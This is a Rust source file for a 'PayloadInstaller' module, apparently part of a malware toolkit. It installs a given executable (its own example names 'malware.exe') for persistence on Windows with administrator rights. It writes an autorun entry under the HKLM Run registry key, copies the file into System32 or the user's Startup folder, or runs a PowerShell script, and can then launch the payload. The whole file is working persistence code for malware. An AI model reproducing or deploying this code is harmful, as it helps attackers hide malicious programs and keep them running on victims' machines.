use std::io;
use winreg::enums::*;
use winreg::RegKey;

use crate::auxiliary::Auxiliary;

const WINDOWS_SYSTEM32: &str = "C:\\Windows\\System32\\";

pub struct PayloadInstaller {
    hide_option: u8,
    file_name: String,
}

impl PayloadInstaller {
    pub fn new(hide_option: u8, file_name: String) -> PayloadInstaller {
        PayloadInstaller {
            file_name,
            hide_option,
        }
    }

    /// Add the program to the registry (autorun)
    ///
    /// # Arguments
    ///
    /// * `program_path` - The path of the program to add to the registry
    /// * `program_name` - The name of the program to add to the registry
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the program was added to the registry successfully
    /// * `Err(io::Error)` - If there was an error adding the program to the registry
    ///
    fn autorun_in_registry(&self, program_path: &str, program_name: &str) -> io::Result<()> {
        //Code to add the program to the registry

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let key = hklm
            .open_subkey_with_flags(
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                KEY_WRITE,
            )
            .unwrap();
        key.set_value(program_name, &program_path).unwrap();
        Ok(())
    }

    /// Copy the program to the startup folder
    ///
    /// # Arguments
    ///
    /// * `program_path` - The path of the program to copy to the startup folder
    /// * `program_name` - The name of the program to copy to the startup folder
    /// * `user_name` - The name of the user to copy the program to the startup folder
    /// * `run_prg` - A boolean indicating if the program should be run after copying it to the startup folder
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the program was copied to the startup folder successfully
    /// * `Err(io::Error)` - If there was an error copying the program to the startup folder
    fn copy_file_to_startup(
        &self,
        program_path: &str,
        program_name: &str,
        user_name: &str,
        run_prg: bool,
    ) -> io::Result<()> {
        //Code to copy the program to the startup folder

        let startup_folder = format!(
            "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            user_name
        );
        let startup_path = format!("{}\\{}", startup_folder, program_name);

        std::fs::copy(program_path, startup_path.clone())?;

        if run_prg {
            std::process::Command::new(&startup_path).spawn()?;
        }

        Ok(())
    }

    /// Copy the program to the system32 folder
    ///
    /// # Arguments
    ///
    /// * `program_path` - The path of the program to copy to the system32 folder
    /// * `program_name` - The name of the program to copy to the system32 folder
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the program was copied to the system32 folder successfully
    /// * `Err(io::Error)` - If there was an error copying the program to the system32 folder
    fn copy_file_to_system32(&self, program_path: &str, program_name: &str) -> io::Result<()> {
        //Code to copy the program to the system32 folder

        let system32_path = format!("{}{}", WINDOWS_SYSTEM32, program_name);
        std::fs::copy(program_path, system32_path)?;
        Ok(())
    }

    /// Run the payload installer. It must be called after creating a new instance of `PayloadInstaller`.
    /// It must be called as administrator
    ///
    /// # Arguments
    ///
    /// * `run_prg` - A boolean indicating if the payload should be run after installing it
    ///
    /// # Returns
    ///
    /// * `Ok(())` - If the payload was installed successfully
    /// * `Err(io::Error)` - If there was an error installing the payload
    ///
    /// # Errors
    ///
    /// If the file does not exist.
    /// If the option is invalid.
    /// If there was an error copying the file.
    /// If there was an error adding the file to the registry.
    /// If there was an error copying the file to the startup folder.
    /// If there was an error copying the file to the system32 folder.
    /// If there was an error running the PowerShell script.
    ///
    /// # Example
    ///
    /// ```
    /// let installer = PayloadInstaller::new(1, "malware.exe".to_string());
    /// match installer.run(true)
    /// {
    ///    Ok(_) => println!("Payload installed successfully"),
    ///   Err(e) => println!("Error: {}", e),
    /// }
    /// ```
    pub fn run(&self, run_prg: bool) -> io::Result<()> {
        let program_path = std::env::current_exe()?
            .parent()
            .unwrap()
            .to_str()
            .unwrap()
            .to_string();

        //find if file exists
        if !std::path::Path::new(&format!("{}\\{}", program_path, self.file_name)).exists() {
            return Err(io::Error::new(io::ErrorKind::NotFound, "File not found"));
        }

        let program_name = self.file_name.clone();
        let program_to_copy = format!("{}\\{}", program_path, program_name);
        let aux = Auxiliary::new();

        if !aux.is_elevated() {
            return Err(io::Error::new(
                io::ErrorKind::PermissionDenied,
                "This program must be run as administrator",
            ));
        }

        match self.hide_option {
            1 => {
                self.autorun_in_registry(
                    format!("{}{}", WINDOWS_SYSTEM32, &program_name).as_str(),
                    &program_name,
                )?;
                self.copy_file_to_system32(&program_to_copy, &program_name)?;

                if run_prg {
                    std::process::Command::new(format!("{}{}", WINDOWS_SYSTEM32, &program_name))
                        .spawn()?;
                }
            }

            2 => {
                self.copy_file_to_startup(
                    &program_to_copy,
                    &program_name,
                    &aux.get_current_user_name(),
                    run_prg,
                )?;
            }

            3 => {
                aux.run_powershell_script(WINDOWS_SYSTEM32, &program_name)?;
                self.copy_file_to_system32(&program_to_copy, &program_name)?;

                if run_prg {
                    std::process::Command::new(format!("{}{}", WINDOWS_SYSTEM32, &program_name))
                        .spawn()?;
                }
            }

            _ => {
                return Err(io::Error::new(
                    io::ErrorKind::InvalidInput,
                    "Invalid option",
                ))
            }
        }

        Ok(())
    }
}
